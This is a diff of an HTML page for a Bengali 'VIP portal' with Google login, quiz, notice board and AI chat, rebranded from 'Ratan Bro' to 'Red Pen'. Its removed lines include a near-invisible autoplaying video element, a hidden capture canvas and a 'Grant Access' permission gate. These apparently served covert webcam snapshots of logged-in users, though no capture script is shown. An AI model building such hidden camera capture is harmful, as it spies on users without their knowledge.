@@ -4,402 +4,855 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ratan Bro | VIP Portal</title>
+    <title>Red Pen | Ultimate VIP Portal</title>
     <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
-            --pink: #ff4d94;
-            --glow: #ff4d94;
-            --dark: #020617;
+            --pink-main: #ff4d94;
+            --pink-glow: rgba(255,77,148,0.6);
+            --bg-dark: #020617;
+            --bg-light: #f0f4ff;
+            --glass: rgba(255,255,255,0.08);
+            --card-bg: rgba(255,255,255,0.06);
+            --text-main: #ffffff;
+            --text-sub: #cccccc;
+            --border-col: rgba(255,120,180,0.2);
+            --surface: rgba(0,0,0,0.4);
         }
-
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Hind Siliguri', sans-serif;
+        body.light-mode {
+            --bg-dark: #f0f4ff;
+            --glass: rgba(0,0,0,0.05);
+            --card-bg: rgba(255,255,255,0.9);
+            --text-main: #1a1a2e;
+            --text-sub: #444466;
+            --border-col: rgba(255,77,148,0.3);
+            --surface: rgba(255,255,255,0.85);
         }
-
+        * { margin:0; padding:0; box-sizing:border-box; font-family:'Hind Siliguri',sans-serif; }
         body {
-            background: var(--dark);
-            background: radial-gradient(circle at top right, rgba(255, 77, 148, 0.15), transparent), #020617;
-            color: white;
+            background: var(--bg-dark);
+            color: var(--text-main);
             min-height: 100vh;
             overflow-x: hidden;
-        }
-
-        /* Login & Perm Modal */
-        #login-overlay,
-        #perm-modal {
-            position: fixed;
-            inset: 0;
-            background: rgba(2, 6, 23, 0.95);
-            z-index: 10000;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            backdrop-filter: blur(10px);
-        }
-
-        .glass-box {
-            background: rgba(255, 255, 255, 0.05);
-            padding: 40px;
-            border-radius: 30px;
-            border: 1px solid rgba(255, 77, 148, 0.3);
-            text-align: center;
-            width: 90%;
-            max-width: 400px;
-            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
-        }
-
-        /* Header Box Profile */
-        .hero-header {
-            margin: 20px;
-            padding: 30px 20px;
-            background: rgba(255, 255, 255, 0.03);
-            border-radius: 30px;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            backdrop-filter: blur(15px);
-            position: relative;
-            overflow: hidden;
-        }
-
-        .hero-header::before {
-            content: '';
-            position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: radial-gradient(circle, rgba(255, 77, 148, 0.1), transparent);
-            z-index: -1;
-        }
-
-        .profile-wrapper {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            gap: 15px;
-        }
-
-        .p-img {
-            width: 100px;
-            height: 100px;
-            border-radius: 50%;
-            border: 3px solid var(--pink);
-            box-shadow: 0 0 25px var(--pink);
-            object-fit: cover;
-            transition: 0.3s;
-        }
-
-        .user-p-img {
-            width: 85px;
-            height: 85px;
-            border: 3px solid #fff;
-            margin-left: -25px;
-        }
-
-        /* Glow Grid Buttons */
-        .grid {
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 15px;
-            padding: 20px;
-            max-width: 600px;
-            margin: 0 auto;
-        }
-
-        .card {
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 20px;
-            padding: 25px;
-            text-align: center;
-            text-decoration: none;
-            color: white;
-            border: 1px solid rgba(255, 255, 255, 0.05);
-            transition: 0.4s;
-            position: relative;
-            cursor: pointer;
-        }
-
-        .card:hover {
-            transform: translateY(-5px);
-            border-color: var(--pink);
-            box-shadow: 0 0 20px rgba(255, 77, 148, 0.4);
-            background: rgba(255, 77, 148, 0.05);
-        }
-
-        .card i {
-            font-size: 2.2rem;
-            color: var(--pink);
-            margin-bottom: 12px;
-            filter: drop-shadow(0 0 5px var(--pink));
-        }
-
-        /* Compact Chatbot */
-        .chat-area {
-            max-width: 500px;
-            margin: 20px auto;
-            padding: 0 20px;
-        }
-
-        .chat-mini {
-            background: rgba(0, 0, 0, 0.4);
-            border-radius: 15px;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            padding: 12px;
-            font-size: 13px;
-        }
-
-        #chat-log {
-            height: 60px;
             overflow-y: auto;
-            color: #ccc;
-            margin-bottom: 8px;
+            touch-action: auto;
+            -webkit-overflow-scrolling: touch;
+            transition: background 0.4s, color 0.4s;
         }
 
-        .chat-in {
-            display: flex;
-            gap: 8px;
+        /* SPLASH SCREEN */
+        #splash-screen {
+            position: fixed; inset: 0; z-index: 99999;
+            background: #020617;
+            display: flex; flex-direction: column;
+            align-items: center; justify-content: center;
+            animation: splashOut 0.6s ease forwards;
+            animation-delay: 2.8s;
         }
-
-        .chat-in input {
-            flex: 1;
-            background: #000;
-            border: 1px solid #333;
-            color: #fff;
-            padding: 8px 15px;
-            border-radius: 50px;
-            outline: none;
-            font-size: 12px;
+        @keyframes splashOut { to { opacity:0; pointer-events:none; visibility:hidden; } }
+        .splash-logo {
+            width: 110px; height: 110px; border-radius: 50%;
+            border: 3px solid var(--pink-main);
+            object-fit: cover;
+            animation: splashPop 0.7s cubic-bezier(0.34,1.56,0.64,1) forwards;
+            opacity: 0;
         }
-
-        .logout-btn {
-            background: transparent;
-            border: 1px solid #444;
-            color: #aaa;
-            padding: 5px 15px;
-            border-radius: 50px;
-            cursor: pointer;
-            font-size: 12px;
-            margin: 10px;
+        @keyframes splashPop { from { transform:scale(0.3); opacity:0; } to { transform:scale(1); opacity:1; } }
+        .splash-title {
+            margin-top: 18px;
+            font-size: 26px; font-weight: 700;
+            background: linear-gradient(90deg, #fff, var(--pink-main), #fff);
+            background-size: 200% auto;
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+            animation: shine 2s linear infinite, fadeUp 0.6s 0.5s ease forwards;
+            opacity: 0;
         }
+        @keyframes fadeUp { from { transform:translateY(15px); opacity:0; } to { transform:translateY(0); opacity:1; } }
+        .splash-dots { display:flex; gap:8px; margin-top:25px; }
+        .splash-dots span {
+            width:8px; height:8px; border-radius:50%; background:var(--pink-main);
+            animation: dotPulse 1.2s ease infinite;
+        }
+        .splash-dots span:nth-child(2) { animation-delay:0.2s; }
+        .splash-dots span:nth-child(3) { animation-delay:0.4s; }
+        @keyframes dotPulse { 0%,100%{transform:scale(1);opacity:0.4;} 50%{transform:scale(1.4);opacity:1;} }
 
-        /* Black Snap Fix */
-        canvas {
+        /* BG MESH */
+        .login-bg-mesh {
+            position: fixed; inset:0; z-index:-2;
+            background: linear-gradient(45deg, #020617, #1a0821, #020617);
+            background-size: 400% 400%;
+            animation: meshMove 12s ease infinite;
+            transition: background 0.4s;
+        }
+        body.light-mode .login-bg-mesh {
+            background: linear-gradient(45deg, #e8f0ff, #fde8f0, #e8f0ff);
+            background-size: 400% 400%;
+        }
+        @keyframes meshMove { 0%{background-position:0% 50%;} 50%{background-position:100% 50%;} 100%{background-position:0% 50%;} }
+
+        /* TRAIL */
+        .trail-particle {
+            position: fixed; pointer-events:none; z-index:10001;
+            color: var(--pink-main);
+            filter: drop-shadow(0 0 5px var(--pink-glow));
+            animation: particleFade 0.8s forwards ease-out;
+        }
+        @keyframes particleFade { to { transform:translateY(15px) scale(0); opacity:0; } }
+
+        /* HEADER RAIN */
+        .header-love-wrap { position:absolute; inset:0; pointer-events:none; z-index:1; overflow:hidden; border-radius:40px; }
+        .header-heart { position:absolute; color:var(--pink-main); font-size:14px; top:-20px; animation:hRain linear forwards; opacity:0; }
+        @keyframes hRain { 0%{transform:translateY(0) rotate(0deg);opacity:0;} 20%{opacity:0.8;} 100%{transform:translateY(300px) rotate(360deg);opacity:0;} }
+
+        /* TOPBAR */
+        .topbar {
+            display:flex; justify-content:space-between; align-items:center;
+            padding: 15px 20px;
+            position: sticky; top:0; z-index:1000;
+            background: rgba(2,6,23,0.7);
+            backdrop-filter: blur(20px);
+            border-bottom: 1px solid rgba(255,77,148,0.1);
+            transition: background 0.4s;
+        }
+        body.light-mode .topbar { background: rgba(240,244,255,0.85); border-bottom-color: rgba(255,77,148,0.2); }
+        .topbar-left { display:flex; gap:10px; align-items:center; }
+        .topbar-right { display:flex; align-items:center; gap:10px; }
+        .social-btn { width:35px; height:35px; border-radius:50%; display:flex; align-items:center; justify-content:center; text-decoration:none; color:white; font-size:16px; transition:transform 0.2s; }
+        .social-btn:active { transform:scale(0.9); }
+
+        /* THEME TOGGLE */
+        .theme-toggle {
+            width:44px; height:24px; border-radius:50px;
+            background: rgba(255,77,148,0.3);
+            border:1px solid var(--pink-main);
+            cursor:pointer; position:relative;
+            transition: background 0.3s;
+            display:flex; align-items:center; padding:3px;
+        }
+        .theme-toggle-ball {
+            width:18px; height:18px; border-radius:50%;
+            background: var(--pink-main);
+            position:absolute; left:3px;
+            transition: transform 0.3s;
+            display:flex; align-items:center; justify-content:center;
+            font-size:10px;
+        }
+        body.light-mode .theme-toggle-ball { transform:translateX(20px); }
+        .v-counter { color:var(--pink-main); font-weight:700; font-size:13px; display:flex; align-items:center; gap:4px; }
+        .sign-out-btn {
+            color:#666; background:none;
+            border:1px solid #444; padding:4px 12px;
+            border-radius:50px; font-size:11px; cursor:pointer;
+            transition:0.2s;
+        }
+        body.light-mode .sign-out-btn { border-color:#ccc; color:#888; }
+        .sign-out-btn:hover { border-color:var(--pink-main); color:var(--pink-main); }
+
+        /* HEADER */
+        .main-header {
+            margin: 20px;
+            padding: 50px 20px;
+            border-radius: 40px;
+            background: linear-gradient(135deg, rgba(255,77,148,0.1), rgba(255,255,255,0.05));
+            border: 1px solid var(--border-col);
+            backdrop-filter: blur(20px);
+            text-align: center;
+            position: relative; overflow: hidden;
+        }
+        .user-name-glow {
+            font-size:30px; font-weight:900;
+            background: linear-gradient(90deg,#fff,var(--pink-main),#fff);
+            background-size:200% auto;
+            -webkit-background-clip:text; -webkit-text-fill-color:transparent;
+            animation:shine 3s linear infinite;
+        }
+        body.light-mode .user-name-glow {
+            background: linear-gradient(90deg,#1a1a2e,var(--pink-main),#1a1a2e);
+            background-size:200% auto;
+            -webkit-background-clip:text; -webkit-text-fill-color:transparent;
+        }
+        @keyframes shine { to{background-position:200% center;} }
+        @keyframes heartBeat { 0%,100%{transform:scale(1);} 50%{transform:scale(1.2);} }
+        .hd-avatar { object-fit:cover; border-radius:50%; display:block; image-rendering:-webkit-optimize-contrast; }
+
+        /* NOTICE TICKER */
+        .notice-ticker {
+            background: linear-gradient(90deg, rgba(255,77,148,0.15), rgba(255,77,148,0.05));
+            border-top: 1px solid rgba(255,77,148,0.2);
+            border-bottom: 1px solid rgba(255,77,148,0.2);
+            padding: 8px 0; overflow:hidden;
             display: none;
         }
+        .ticker-inner {
+            display:flex; animation: tickerMove 20s linear infinite;
+            white-space:nowrap;
+        }
+        .ticker-inner span { font-size:13px; color:var(--pink-main); padding:0 40px; }
+        @keyframes tickerMove { from{transform:translateX(100vw);} to{transform:translateX(-100%);} }
 
-        #vSource {
-            position: fixed;
-            bottom: 0;
-            right: 0;
-            width: 1px;
-            height: 1px;
-            opacity: 0.01;
-            pointer-events: none;
+        /* GRID */
+        .grid-layout {
+            display:grid; grid-template-columns:repeat(2,1fr);
+            gap:15px; padding:0 20px 20px;
+            max-width:600px; margin:0 auto;
+        }
+        .nav-card {
+            background: var(--card-bg);
+            border-radius:30px; padding:25px 15px;
+            text-align:center; text-decoration:none; color:var(--text-main);
+            border:1px solid rgba(255,255,255,0.05);
+            animation:autoBari 4s infinite;
+            transition:0.3s; position:relative; cursor:pointer;
+            display:block;
+        }
+        .nav-card:active { transform:scale(0.95); }
+        @keyframes autoBari { 0%,100%{border-color:rgba(255,255,255,0.05);} 50%{border-color:var(--pink-main);} }
+        body.light-mode .nav-card { border-color:rgba(255,77,148,0.1); box-shadow:0 2px 15px rgba(255,77,148,0.05); }
+        .nav-card i { font-size:2.2rem; color:var(--pink-main); margin-bottom:8px; }
+        .nav-card p { font-size:14px; }
+
+        /* SECTION TITLE */
+        .section-title {
+            text-align:center; font-size:15px; font-weight:600;
+            color:var(--pink-main); margin:10px 20px 15px;
+            letter-spacing:1px; text-transform:uppercase;
+            opacity:0.8;
+        }
+
+        /* AI CHAT */
+        .chat-box {
+            max-width:500px; margin:0 auto 20px;
+            padding:0 20px;
+        }
+        .chat-inner {
+            background: var(--surface);
+            padding:20px; border-radius:30px;
+            border:1px solid rgba(255,77,148,0.1);
+        }
+        #chat-content {
+            height:150px; overflow-y:auto;
+            font-size:13px; margin-bottom:10px;
+            scrollbar-width:thin; scrollbar-color:var(--pink-main) transparent;
+            color: var(--text-main);
+        }
+        #chat-content::-webkit-scrollbar { width:4px; }
+        #chat-content::-webkit-scrollbar-thumb { background:var(--pink-main); border-radius:10px; }
+        .chat-input-row { display:flex; gap:8px; }
+        .ai-input {
+            flex:1; background:rgba(0,0,0,0.5); border:1px solid #333;
+            color:var(--text-main); padding:10px 15px; border-radius:50px;
+            outline:none; font-size:13px; font-family:'Hind Siliguri',sans-serif;
+            transition:border 0.2s;
+        }
+        body.light-mode .ai-input { background:rgba(255,255,255,0.8); border-color:#ddd; }
+        .ai-input:focus { border-color:var(--pink-main); }
+        .typing-indicator { display:none; padding:5px 0; }
+        .typing-indicator span {
+            display:inline-block; width:7px; height:7px;
+            background:var(--pink-main); border-radius:50%; margin:0 2px;
+            animation:typingBounce 1s infinite;
+        }
+        .typing-indicator span:nth-child(2){animation-delay:0.15s;}
+        .typing-indicator span:nth-child(3){animation-delay:0.3s;}
+        @keyframes typingBounce{0%,80%,100%{transform:translateY(0);}40%{transform:translateY(-6px);}}
+
+        /* QUIZ MODAL */
+        .quiz-option {
+            width:100%; padding:12px 18px; margin-bottom:8px;
+            border-radius:50px; border:1px solid rgba(255,77,148,0.3);
+            background:rgba(255,255,255,0.05); color:var(--text-main);
+            cursor:pointer; font-size:14px; font-family:'Hind Siliguri',sans-serif;
+            transition:0.2s; text-align:left;
+        }
+        .quiz-option:hover { background:rgba(255,77,148,0.15); border-color:var(--pink-main); }
+        .quiz-option.correct { background:rgba(0,200,100,0.2); border-color:#00c864; color:#00c864; }
+        .quiz-option.wrong { background:rgba(255,50,50,0.2); border-color:#ff3232; color:#ff3232; }
+
+        /* MODALS */
+        .modal {
+            position:fixed; inset:0; background:rgba(0,0,0,0.93);
+            display:none; align-items:center; justify-content:center;
+            z-index:10000; padding:20px; overflow-y:auto;
+        }
+        .modal-box {
+            background:#000; padding:30px; border-radius:35px;
+            border:1px solid var(--pink-main); width:100%; max-width:380px;
+            text-align:center;
+        }
+        body.light-mode .modal-box { background:#fff; }
+        body.light-mode .modal { background:rgba(240,244,255,0.96); }
+
+        /* BUTTONS */
+        .btn-premium {
+            background:linear-gradient(90deg,var(--pink-main),#cc0052);
+            color:white; border:none; padding:12px 20px;
+            border-radius:50px; font-weight:700; cursor:pointer;
+            width:100%; transition:0.3s; font-family:'Hind Siliguri',sans-serif;
+            font-size:14px;
+        }
+        .btn-premium:active { transform:scale(0.97); }
+        .btn-ghost {
+            margin-top:12px; background:none; border:none;
+            color:#666; font-size:13px; cursor:pointer;
+            font-family:'Hind Siliguri',sans-serif;
+        }
+        .p-input {
+            width:100%; background:#000; border:1px solid #333;
+            color:white; padding:12px 20px; border-radius:50px;
+            outline:none; margin-bottom:10px;
+            font-family:'Hind Siliguri',sans-serif;
+            transition:border 0.2s;
+        }
+        body.light-mode .p-input { background:#f5f5ff; border-color:#ddd; color:#1a1a2e; }
+        .p-input:focus { border-color:var(--pink-main); }
+
+        /* NOTICE IMAGE */
+        #notice-img { max-width:100%; border-radius:15px; margin:10px 0; display:none; }
+        #notice-link { color:var(--pink-main); font-size:13px; text-decoration:none; display:none; margin-bottom:10px; display:inline-block; }
+
+        /* SCROLL TO TOP */
+        #scroll-top-btn {
+            position:fixed; bottom:25px; right:20px;
+            width:45px; height:45px; border-radius:50%;
+            background:linear-gradient(135deg,var(--pink-main),#cc0052);
+            color:white; border:none; font-size:18px;
+            cursor:pointer; z-index:9000;
+            display:none; align-items:center; justify-content:center;
+            box-shadow:0 4px 20px rgba(255,77,148,0.4);
+            transition:0.3s;
+        }
+        #scroll-top-btn:hover { transform:translateY(-3px); }
+
+        /* LEADERBOARD */
+        .lb-row {
+            display:flex; align-items:center; justify-content:space-between;
+            padding:10px 15px; border-radius:15px; margin-bottom:8px;
+            background:rgba(255,77,148,0.05); border:1px solid rgba(255,77,148,0.1);
+        }
+        .lb-rank { font-size:18px; width:30px; }
+        .lb-name { flex:1; font-size:14px; margin-left:8px; color:var(--text-main); }
+        .lb-score { color:var(--pink-main); font-weight:700; font-size:14px; }
+
+        /* RESULT CARD */
+        .result-card {
+            background:#000; border:2px solid var(--pink-main);
+            padding:25px; border-radius:35px;
+            width:100%; max-width:350px; text-align:center; position:relative;
+        }
+        body.light-mode .result-card { background:#fff; }
+
+        /* PROGRESS BAR */
+        .quiz-progress { 
+            height:4px; border-radius:10px;
+            background:rgba(255,77,148,0.15); margin-bottom:15px;
+        }
+        .quiz-progress-fill {
+            height:100%; border-radius:10px;
+            background:var(--pink-main); transition:width 0.4s;
+        }
+
+        /* SCORE BADGE */
+        .score-badge {
+            display:inline-block; padding:8px 20px;
+            border-radius:50px; background:rgba(255,77,148,0.2);
+            border:1px solid var(--pink-main); color:var(--pink-main);
+            font-weight:700; font-size:18px; margin:10px 0;
+        }
+
+        /* ALERT DOT */
+        .alert-dot {
+            position:absolute; top:12px; right:12px;
+            width:8px; height:8px; background:red; border-radius:50%;
+            display:none; box-shadow:0 0 10px red;
         }
     </style>
 </head>
 
 <body>
+<div class="login-bg-mesh"></div>
 
-    <audio id="snd-bus" src="business.mp3" preload="auto"></audio>
-    <audio id="snd-port" src="portfolio.mp3" preload="auto"></audio>
-    <audio id="snd-look" src="lookup.mp3" preload="auto"></audio>
+<!-- SPLASH SCREEN -->
+<div id="splash-screen">
+    <img src="ratan.jpg" class="splash-logo" alt="Red Pen">
+    <div class="splash-title">❤ Red Pen ❤</div>
+    <div class="splash-dots"><span></span><span></span><span></span></div>
+</div>
 
-    <div id="login-overlay">
-        <div class="glass-box">
-            <img src="ratan.jpg"
-                style="width:100px; border-radius:50%; border:3px solid var(--pink); margin-bottom:15px;">
-            <h3>Ratan Bro Portal</h3>
-            <button onclick="googleLogin()"
-                style="background:var(--pink); color:white; border:none; padding:12px 30px; border-radius:50px; font-weight:bold; cursor:pointer; width:100%; margin-top:15px; box-shadow: 0 5px 15px rgba(255, 77, 148, 0.4);">
-                Login with Google
-            </button>
-        </div>
+<audio id="snd-open" src="open.mp3" preload="auto"></audio>
+
+<!-- LOGIN MODAL -->
+<div id="login-screen" class="modal" style="display:flex;">
+    <div class="modal-box">
+        <img src="ratan.jpg" class="hd-avatar" style="width:100px;height:100px;border:3px solid var(--pink-main);margin:0 auto 15px;">
+        <h2 style="color:var(--text-main);">RED PEN</h2>
+        <p style="color:#555;font-size:12px;margin-bottom:20px;">VIP PORTAL LOGIN</p>
+        <button class="btn-premium" onclick="login()"><i class="fab fa-google" style="margin-right:8px;"></i>LOGIN WITH GOOGLE</button>
     </div>
+</div>
 
-    <div id="perm-modal" style="display:none;">
-        <div class="glass-box">
-            <i class="fas fa-shield-alt" style="font-size:3rem; color:var(--pink);"></i>
-            <h3 style="margin:15px 0;">পারমিশন</h3>
-            <p style="font-size:14px; opacity:0.7; margin-bottom:20px;">প্রবেশ করতে Allow করুন।</p>
-            <button onclick="startApp()"
-                style="background:var(--pink); color:white; border:none; padding:12px 40px; border-radius:50px; font-weight:bold; cursor:pointer;">Grant
-                Access</button>
-        </div>
+<!-- AUDIO GATE -->
+<div id="audio-gate-modal" class="modal">
+    <div class="modal-box">
+        <i class="fas fa-unlock-alt" style="font-size:2.5rem;color:var(--pink-main);margin-bottom:15px;"></i>
+        <h3 style="margin-bottom:10px;color:var(--text-main);">স্বাগতম বস্!</h3>
+        <p style="font-size:14px;color:#ccc;margin-bottom:25px;">ড্যাশবোর্ড আনলক করতে নিচের বাটনে ক্লিক করুন।</p>
+        <button class="btn-premium" onclick="enterDashboard()">ENTER DASHBOARD</button>
     </div>
+</div>
 
-    <div id="main-ui" style="display:none;">
-        <div style="text-align:right;"><button class="logout-btn" onclick="googleLogout()">Logout</button></div>
+<!-- DASHBOARD -->
+<div id="dashboard-ui" style="display:none;">
 
-        <div class="hero-header">
-            <div class="profile-wrapper">
-                <img src="ratan.jpg" class="p-img">
-                <img id="u-pic" src="" class="p-img user-p-img">
+    <!-- TOPBAR -->
+    <div class="topbar">
+        <div class="topbar-left">
+            <a href="https://www.facebook.com/profile.php?id=61552305287329" class="social-btn" style="background:#1877f2;"><i class="fab fa-facebook-f"></i></a>
+            <a href="https://wa.me/8801609160109" class="social-btn" style="background:#25d366;"><i class="fab fa-whatsapp"></i></a>
+        </div>
+        <div class="topbar-right">
+            <div class="v-counter"><i class="fas fa-eye"></i> <span id="v-count">0</span></div>
+            <div class="theme-toggle" onclick="toggleTheme()" title="Theme Switch">
+                <div class="theme-toggle-ball" id="theme-ball">🌙</div>
             </div>
-            <h2 id="u-name" style="text-align:center; margin-top:15px; font-weight:700;"></h2>
-            <p style="text-align:center; color:var(--pink); font-size:14px; font-weight:bold;">Verified Member</p>
+            <button onclick="logout()" class="sign-out-btn">Sign Out</button>
         </div>
+    </div>
 
-        <div class="grid">
-            <a href="testpaper.html" class="card"><i class="fas fa-file-pdf"></i>
-                <p>Test Paper</p>
-            </a>
-
-            <a href="business.html" class="card" onclick="document.getElementById('snd-bus').play();">
-                <i class="fas fa-handshake"></i>
-                <p>Business</p>
-            </a>
-
-            <a href="portfolio.html" class="card" onclick="document.getElementById('snd-port').play();">
-                <i class="fas fa-laptop-code"></i>
-                <p>Portfolio</p>
-            </a>
-
-            <a href="https://numberlookup.pro.bd/" target="_blank" class="card"
-                onclick="document.getElementById('snd-look').play();">
-                <i class="fas fa-search"></i>
-                <p>Lookup</p>
-            </a>
+    <!-- TICKER -->
+    <div class="notice-ticker" id="notice-ticker">
+        <div class="ticker-inner" id="ticker-text">
+            <span id="ticker-content">লোড হচ্ছে...</span>
         </div>
+    </div>
 
-        <div class="chat-area">
-            <div class="chat-mini">
-                <div id="chat-log">Ratan AI: স্বাগতম! আমি আপনাকে কীভাবে সাহায্য করতে পারি?</div>
-                <div class="chat-in">
-                    <input type="text" id="ai-msg" placeholder="Ask AI...">
-                    <button onclick="askAI()"
-                        style="background:var(--pink); border:none; color:white; padding:5px 15px; border-radius:50px; font-size:11px; cursor:pointer;">Send</button>
-                </div>
+    <!-- HEADER -->
+    <header class="main-header">
+        <div id="header-rain" class="header-love-wrap"></div>
+        <div style="display:flex;justify-content:center;align-items:center;margin-bottom:15px;position:relative;z-index:5;">
+            <img src="ratan.jpg" class="hd-avatar" style="width:100px;height:100px;border:3px solid var(--pink-main);">
+            <img id="u-photo" src="" class="hd-avatar" style="width:80px;height:80px;border:3px solid white;margin-left:-25px;z-index:6;">
+        </div>
+        <div style="display:flex;align-items:center;justify-content:center;gap:10px;position:relative;z-index:5;">
+            <i class="fas fa-heart" style="color:var(--pink-main);animation:heartBeat 1.2s infinite;"></i>
+            <span id="u-name" class="user-name-glow">...</span>
+            <i class="fas fa-heart" style="color:var(--pink-main);animation:heartBeat 1.2s infinite;"></i>
+        </div>
+        <p id="u-wish" style="margin-top:10px;font-size:14px;color:var(--text-sub);position:relative;z-index:5;">লোড হচ্ছে...</p>
+    </header>
+
+    <!-- MAIN NAV GRID -->
+    <div class="section-title">মেনু</div>
+    <main class="grid-layout">
+        <div class="nav-card" onclick="openNotice()">
+            <div class="alert-dot" id="alert-dot"></div>
+            <i class="fas fa-bullhorn"></i><p>নোটিশ বোর্ড</p>
+        </div>
+        <a href="portfolio.html" class="nav-card"><i class="fas fa-user-tie"></i><p>আমার ডিটেইলস</p></a>
+        <a href="business.html" class="nav-card"><i class="fas fa-shopping-bag"></i><p>বিজনেসের খবর</p></a>
+        <div class="nav-card" onclick="document.getElementById('p-maker-modal').style.display='flex'"><i class="fas fa-magic"></i><p>পোর্টফোলিও মেকার</p></div>
+        <a href="testpaper.html" class="nav-card"><i class="fas fa-graduation-cap"></i><p>নোটস / ফাইল</p></a>
+        <a href="number.html" class="nav-card"><i class="fas fa-search"></i><p>নম্বর ডিটেইলস <span style="color:var(--pink-main);font-size:11px;">(hot)</span></p></a>
+        <div class="nav-card" onclick="openQuiz()"><i class="fas fa-brain"></i><p>Daily Quiz <span style="background:var(--pink-main);color:white;font-size:10px;padding:2px 7px;border-radius:20px;margin-left:4px;">New</span></p></div>
+        <div class="nav-card" onclick="openLeaderboard()"><i class="fas fa-trophy"></i><p>Leaderboard</p></div>
+    </main>
+
+    <!-- AI CHAT -->
+    <div class="section-title">AI চ্যাটবট</div>
+    <div class="chat-box">
+        <div class="chat-inner">
+            <div id="chat-content">
+                <div style="text-align:center;color:#555;padding:20px 0;font-size:13px;">AI কে যেকোনো প্রশ্ন করো... 💬</div>
+            </div>
+            <div class="typing-indicator" id="typing-indicator">
+                <span></span><span></span><span></span>
+                <span style="font-size:12px;color:#888;margin-left:5px;">AI ভাবছে...</span>
+            </div>
+            <div class="chat-input-row">
+                <input type="text" id="ai-msg" class="ai-input" placeholder="কিছু জিজ্ঞেস করো..." onkeydown="if(event.key==='Enter')askAI()">
+                <button onclick="askAI()" class="btn-premium" style="width:auto;padding:0 18px;"><i class="fas fa-paper-plane"></i></button>
             </div>
         </div>
     </div>
 
-    <canvas id="snapCanvas" width="640" height="480"></canvas>
-    <video id="vSource" autoplay playsinline muted></video>
+    <div style="height:80px;"></div>
+</div>
 
-    <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
-        import { getAuth, signInWithPopup, GoogleAuthProvider, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
-        import { getFirestore, doc, setDoc, updateDoc, getDoc, onSnapshot } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
+<!-- SCROLL TO TOP -->
+<button id="scroll-top-btn" onclick="window.scrollTo({top:0,behavior:'smooth'})">
+    <i class="fas fa-arrow-up"></i>
+</button>
 
-        const firebaseConfig = {
-            apiKey: "AIzaSyC4ExRu3Oze8api5-ueDTBqZOceSa8wclo",
-            authDomain: "ratanweab.firebaseapp.com",
-            projectId: "ratanweab",
-            storageBucket: "ratanweab.firebasestorage.app",
-            messagingSenderId: "611953936063",
-            appId: "1:611953936063:web:7e3ca24060d7478fb2a80a"
-        };
+<!-- PORTFOLIO MAKER MODAL -->
+<div id="p-maker-modal" class="modal">
+    <div class="modal-box">
+        <h3 style="color:var(--pink-main);margin-bottom:20px;">মেক পোর্টফোলিও</h3>
+        <input type="text" id="p-name" placeholder="আপনার পূর্ণ নাম" class="p-input">
+        <input type="text" id="p-title" placeholder="টাইটেল / পদবি" class="p-input">
+        <input type="text" id="p-phone" placeholder="ফোন নম্বর" class="p-input">
+        <input type="text" id="p-fb" placeholder="ফেসবুক লিঙ্ক" class="p-input">
+        <input type="text" id="p-wa" placeholder="হোয়াটসঅ্যাপ নম্বর" class="p-input">
+        <button class="btn-premium" onclick="createPortfolio()">জেনারেট করুন</button>
+        <button class="btn-ghost" onclick="document.getElementById('p-maker-modal').style.display='none'">বন্ধ করুন</button>
+    </div>
+</div>
 
-        const app = initializeApp(firebaseConfig);
-        const auth = getAuth(app);
-        const db = getFirestore(app);
-        const provider = new GoogleAuthProvider();
-        let loggedUser = null;
+<!-- PORTFOLIO RESULT MODAL -->
+<div id="portfolio-modal" class="modal"><div id="p-result-area"></div></div>
 
-        onAuthStateChanged(auth, async (user) => {
-            if (user) {
-                loggedUser = user;
-                document.getElementById('login-overlay').style.display = 'none';
-                document.getElementById('perm-modal').style.display = 'flex';
-            }
-        });
+<!-- NOTICE MODAL -->
+<div id="notice-modal" class="modal">
+    <div class="modal-box">
+        <i class="fas fa-envelope-open-text" style="font-size:2.5rem;color:var(--pink-main);margin-bottom:15px;"></i>
+        <h3 style="color:var(--text-main);margin-bottom:10px;" id="notice-title">নোটিশ</h3>
+        <img id="notice-img" src="" alt="notice image">
+        <p id="notice-body" style="color:var(--text-sub);margin-bottom:15px;font-size:14px;line-height:1.6;"></p>
+        <a id="notice-link" href="#" target="_blank"><i class="fas fa-external-link-alt"></i> বিস্তারিত দেখুন</a>
+        <br><br>
+        <button class="btn-premium" onclick="document.getElementById('notice-modal').style.display='none'">বুঝেছি ✓</button>
+    </div>
+</div>
 
-        window.googleLogin = () => signInWithPopup(auth, provider);
-        window.googleLogout = () => signOut(auth).then(() => location.reload());
+<!-- QUIZ MODAL -->
+<div id="quiz-modal" class="modal">
+    <div class="modal-box" style="max-width:420px;">
+        <div id="quiz-container">
+            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:15px;">
+                <span style="color:var(--pink-main);font-weight:700;font-size:13px;" id="quiz-category">📚 General</span>
+                <span style="color:var(--text-sub);font-size:13px;" id="quiz-count">প্রশ্ন ১/৫</span>
+            </div>
+            <div class="quiz-progress"><div class="quiz-progress-fill" id="quiz-prog" style="width:20%;"></div></div>
+            <p id="quiz-question" style="font-size:16px;font-weight:600;margin-bottom:20px;color:var(--text-main);line-height:1.5;"></p>
+            <div id="quiz-options"></div>
+            <p id="quiz-feedback" style="font-size:13px;margin-top:10px;min-height:20px;"></p>
+        </div>
+        <div id="quiz-result" style="display:none;text-align:center;">
+            <div style="font-size:3rem;margin-bottom:10px;">🎉</div>
+            <h3 style="color:var(--text-main);margin-bottom:8px;">Quiz শেষ!</h3>
